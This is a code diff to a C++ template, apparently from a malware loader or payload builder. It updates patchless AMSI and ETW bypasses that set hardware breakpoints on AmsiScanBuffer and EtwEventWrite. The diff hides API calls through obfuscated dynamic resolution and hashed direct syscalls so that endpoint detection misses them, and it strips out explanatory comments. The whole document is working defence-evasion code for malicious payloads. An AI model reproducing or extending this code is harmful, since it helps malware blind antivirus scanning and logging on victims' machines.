@@ -141,15 +141,15 @@ static bool check_sandbox() {
 {{#IF AMSI_HWBP}}
 // Hardware breakpoint AMSI bypass (patchless)
 // Based on @CCob's concept, @ShitSecure's Nim implementation
+// Uses syscalls for context manipulation to avoid Get/SetThreadContext detection
 static PVOID g_amsi_veh = nullptr;
 static void* g_amsi_target_addr = nullptr;
 
 static LONG CALLBACK amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
     if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
         if (exc->ExceptionRecord->ExceptionAddress == g_amsi_target_addr) {
-            // AmsiScanBuffer hit - set return value to E_INVALIDARG and simulate ret
 #ifdef _WIN64
-            exc->ContextRecord->Rax = 0x80070057; // E_INVALIDARG
+            exc->ContextRecord->Rax = 0x80070057;
             exc->ContextRecord->Rip = *reinterpret_cast<ULONG_PTR*>(exc->ContextRecord->Rsp);
             exc->ContextRecord->Rsp += sizeof(ULONG_PTR);
 #else
@@ -157,7 +157,6 @@ static LONG CALLBACK amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
             exc->ContextRecord->Eip = *reinterpret_cast<DWORD*>(exc->ContextRecord->Esp);
             exc->ContextRecord->Esp += sizeof(DWORD);
 #endif
-            // Clear the hardware breakpoint (one-shot)
             exc->ContextRecord->Dr0 = 0;
             exc->ContextRecord->Dr7 &= ~1;
             return EXCEPTION_CONTINUE_EXECUTION;
@@ -173,19 +172,29 @@ static void bypass_amsi_hwbp() {
     g_amsi_target_addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
     if (!g_amsi_target_addr) return;
 
-    g_amsi_veh = AddVectoredExceptionHandler(1, amsi_hwbp_handler);
+    using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
+    auto pAddVEH = reinterpret_cast<AddVEH_t>(
+        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
+                       obf("AddVectoredExceptionHandler")));
+    if (!pAddVEH) return;
+    g_amsi_veh = pAddVEH(1, amsi_hwbp_handler);
+
+    // Use NtGetContextThread/NtSetContextThread via syscalls
+    using NtGetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    using NtSetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    auto NtGCT = get_syscall_fn<NtGetContextThread_t>(HASH_NtGetContextThread);
+    auto NtSCT = get_syscall_fn<NtSetContextThread_t>(HASH_NtSetContextThread);
+    if (!NtGCT || !NtSCT) return;
 
     CONTEXT ctx = {};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    HANDLE hThread = GetCurrentThread();
-    GetThreadContext(hThread, &ctx);
+    NtGCT(GetCurrentThread(), &ctx);
 
     ctx.Dr0 = reinterpret_cast<DWORD_PTR>(g_amsi_target_addr);
-    ctx.Dr7 |= 1; // Enable DR0 local breakpoint
-    ctx.Dr7 &= ~(3 << 16); // Break on execution
+    ctx.Dr7 |= 1;
+    ctx.Dr7 &= ~(3 << 16);
 
-    SetThreadContext(hThread, &ctx);
+    NtSCT(GetCurrentThread(), &ctx);
 }
 {{#ENDIF}}
 
@@ -358,18 +367,28 @@ static void bypass_etw_hwbp() {
     g_etw_target_addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
     if (!g_etw_target_addr) return;
 
-    g_etw_veh = AddVectoredExceptionHandler(1, etw_hwbp_handler);
+    using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
+    auto pAddVEH = reinterpret_cast<AddVEH_t>(
+        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
+                       obf("AddVectoredExceptionHandler")));
+    if (!pAddVEH) return;
+    g_etw_veh = pAddVEH(1, etw_hwbp_handler);
+
+    using NtGetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    using NtSetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    auto NtGCT = get_syscall_fn<NtGetContextThread_t>(HASH_NtGetContextThread);
+    auto NtSCT = get_syscall_fn<NtSetContextThread_t>(HASH_NtSetContextThread);
+    if (!NtGCT || !NtSCT) return;
 
     CONTEXT ctx = {};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    HANDLE hThread = GetCurrentThread();
-    GetThreadContext(hThread, &ctx);
+    NtGCT(GetCurrentThread(), &ctx);
 
     ctx.Dr1 = reinterpret_cast<DWORD_PTR>(g_etw_target_addr);
-    ctx.Dr7 |= 4; // Enable DR1 local breakpoint
-    ctx.Dr7 &= ~(3 << 20); // Break on execution
+    ctx.Dr7 |= 4;
+    ctx.Dr7 &= ~(3 << 20);
 
-    SetThreadContext(hThread, &ctx);
+    NtSCT(GetCurrentThread(), &ctx);
 }
 {{#ENDIF}}
 
